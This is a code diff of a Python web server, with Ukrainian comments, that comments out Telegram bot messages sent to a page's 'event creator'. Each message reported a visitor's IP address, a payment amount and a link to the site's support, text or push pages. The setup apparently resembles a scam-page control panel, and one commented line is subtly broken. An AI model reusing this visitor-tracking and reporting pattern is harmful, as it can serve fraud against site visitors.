@@ -1330,26 +1330,26 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Надсилаємо лог про кнопку
                         send_button_log_to_chat('support', ip, page_code, None, event_info)
                         
-                        # Також надсилаємо event creator, якщо знайдено
-                        if user_id:
-                            try:
-                                button_msg = f"🔔 Сторінка техпідтримки завантажена на вашій сторінці {page_code}\n\n📶 IP: {ip}"
-                                if event_info:
-                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
-                                
-                                # Формуємо URL з сумою для техпідтримки
-                                support_url = f"https://artpullse.com/support/?page={page_code}"
-                                if event_info and event_info.get('price'):
-                                    support_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
-                                
-                                button_msg += f"\n🔗 URL: {support_url}"
-                                
-                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                                data_event_creator = {"chat_id": user_id, "text": button_msg}
-                                requests.post(url, data=data_event_creator, timeout=1)
-                                print(f"📤 Лог про support кнопку надіслано event creator {user_id}")
-                            except Exception as e:
-                                print(f"[set_support_flag] Error sending to event creator: {e}")
+                        # Закоментовано надсилання support-повідомлення event creator
+                        # if user_id:
+                        #     try:
+                        #         button_msg = f"🔔 Сторінка техпідтримки завантажена на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                        #         if event_info:
+                        #             button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                        #         
+                        #         # Формуємо URL з сумою для техпідтримки
+                        #         support_url = f"https://artpullse.com/support/?page={page_code}"
+                        #         if event_info and event_info.get('price'):
+                        #             support_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                        #         
+                        #         button_msg += f"\n🔗 URL: {support_url}"
+                        #         
+                        #         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                        #         data_event_creator = {"chat_id": user_id, "text": button_msg}
+                        #         requests.post(url, data=data_event_creator, timeout=1)
+                        #         print(f"📤 Лог про support кнопку надіслано event creator {user_id}")
+                        #     except Exception as e:
+                        #         print(f"[set_support_flag] Error sending to event creator: {e}")
                                 
                     except Exception as e:
                         print(f"[set_support_flag] Error logging button: {e}")
@@ -1381,26 +1381,26 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Надсилаємо лог про кнопку
                         send_button_log_to_chat('text', ip, page_code, None, event_info)
                         
-                        # Також надсилаємо event creator, якщо знайдено
-                        if user_id:
-                            try:
-                                button_msg = f"🔔 Кнопка з текстом з'явилася на вашій сторінці {page_code}\n\n📶 IP: {ip}"
-                                if event_info:
-                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
-                                
-                                # Формуємо URL з сумою для text
-                                text_url = f"https://artpullse.com/text/?page={page_code}"
-                                if event_info and event_info.get('price'):
-                                    text_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
-                                
-                                button_msg += f"\n🔗 URL: {text_url}"
-                                
-                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                                data_event_creator = {"chat_id": user_id, "text": button_msg}
-                                requests.post(url, data=data_event_creator, timeout=1)
-                                print(f"📤 Лог про text кнопку надіслано event creator {user_id}")
-                            except Exception as e:
-                                print(f"[set_support_flag] Error sending to event creator: {e}")
+                        # Закоментовано надсилання text-повідомлення event creator
+                        # if user_id:
+                        #     try:
+                        #         button_msg = f"🔔 Кнопка з текстом з'явилася на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                        #         if event_info:
+                        #             button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                        #         
+                        #         # Формуємо URL з сумою для text
+                        #         text_url = f"https://artpullse.com/text/?page={page_code}"
+                        #         if event_info and event_info.get('price'):
+                        #             text_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                        #         
+                        #         text_url += f"\n🔗 URL: {text_url}"
+                        #         
+                        #         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                        #         data_event_creator = {"chat_id": user_id, "text": button_msg}
+                        #         requests.post(url, data=data_event_creator, timeout=1)
+                        #         print(f"📤 Лог про text кнопку надіслано event creator {user_id}")
+                        #     except Exception as e:
+                        #         print(f"[set_support_flag] Error sending to event creator: {e}")
                                 
                     except Exception as e:
                         print(f"[set_support_flag] Error logging button: {e}")
@@ -1499,26 +1499,26 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Надсилаємо лог про кнопку
                         send_button_log_to_chat('push', ip, page_code, None, event_info)
                         
-                        # Також надсилаємо event creator, якщо знайдено
-                        if user_id:
-                            try:
-                                button_msg = f"🔔 Push-повідомлення з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
-                                if event_info:
-                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
-                                
-                                # Формуємо URL з сумою для push-повідомлення
-                                push_url = f"https://artpullse.com/push/?page={page_code}"
-                                if event_info and event_info.get('price'):
-                                    push_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
-                                
-                                button_msg += f"\n🔗 URL: {push_url}"
-                                
-                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                                data_event_creator = {"chat_id": user_id, "text": button_msg}
-                                requests.post(url, data=data_event_creator, timeout=1)
-                                print(f"📤 Лог про push кнопку надіслано event creator {user_id}")
-                            except Exception as e:
-                                print(f"[set_push_flag] Error sending to event creator: {e}")
+                        # Закоментовано надсилання push-повідомлення event creator
+                        # if user_id:
+                        #     try:
+                        #         button_msg = f"🔔 Push-повідомлення з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                        #         if event_info:
+                        #             button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                        #         
+                        #         # Формуємо URL з сумою для push-повідомлення
+                        #         push_url = f"https://artpullse.com/push/?page={page_code}"
+                        #         if event_info and event_info.get('price'):
+                        #             push_url += f"&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
+                        #         
+                        #         button_msg += f"\n🔗 URL: {push_url}"
+                        #         
+                        #         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                        #         data_event_creator = {"chat_id": user_id, "text": button_msg}
+                        #         requests.post(url, data=data_event_creator, timeout=1)
+                        #         print(f"📤 Лог про push кнопку надіслано event creator {user_id}")
+                        #     except Exception as e:
+                        #         print(f"[set_push_flag] Error sending to event creator: {e}")
                                 
                     except Exception as e:
                         print(f"[set_push_flag] Error logging button: {e}")
